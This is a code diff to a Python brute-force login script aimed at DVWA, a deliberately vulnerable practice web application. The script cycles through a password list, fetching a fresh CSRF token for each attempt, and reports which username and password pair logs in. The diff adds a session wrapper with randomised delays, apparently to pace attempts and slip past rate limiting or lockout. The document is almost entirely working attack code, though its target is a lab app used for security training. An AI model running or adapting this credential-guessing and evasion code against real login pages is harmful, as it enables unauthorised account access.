@@ -1,10 +1,8 @@
-import os
 
-import requests
-from bs4 import BeautifulSoup
 
 from dvwa.utils import get_csrf_token
 from dvwa.globals import DVWA_URL
+from dvwa.dynamic_session import DynamicSession
 
 
 def main():
@@ -33,14 +31,10 @@ def main():
         "abc123",
     ]
 
-    # Start a session to maintain cookies and handle redirects
-    session = requests.Session()
+    session = DynamicSession(delay_avg=0.2, delay_std=0.3)
 
-    # Brute-force login attempts
     for password in passwords:
-        # Get a fresh CSRF token before each login attempt
         csrf_token = get_csrf_token(session, url)
-        print(f"Trying password: {password}")
 
         data = {
             "username": username,
@@ -51,24 +45,23 @@ def main():
 
         response = session.post(url, data=data, allow_redirects=False)
 
-        # Handle the redirection
         if response.status_code == 302:
             redirect_url = response.headers.get("Location")
             if redirect_url:
-                # Handle relative redirect URLs
                 if not redirect_url.startswith("http"):
                     redirect_url = f"{DVWA_URL}/{redirect_url}"
+
                 final_response = session.get(redirect_url)
 
                 if "Logout" in final_response.text:
-                    print(f"[SUCCESS] Password found: {username}:{password}")
+                    print(f"[SUCCESS] {username}:{password}")
                     break
                 else:
-                    print(f"[Trying {username}:{password}] - Failed")
+                    print(f"[FAILED] {username}:{password}")
             else:
                 print("Redirect URL not found in response headers.")
         else:
-            print(f"[Trying {username}:{password}] - No redirection, failed login.")
+            print("No redirection found. Failed login.")
     else:
         print("Brute-force attack failed. No matching password found.")
 
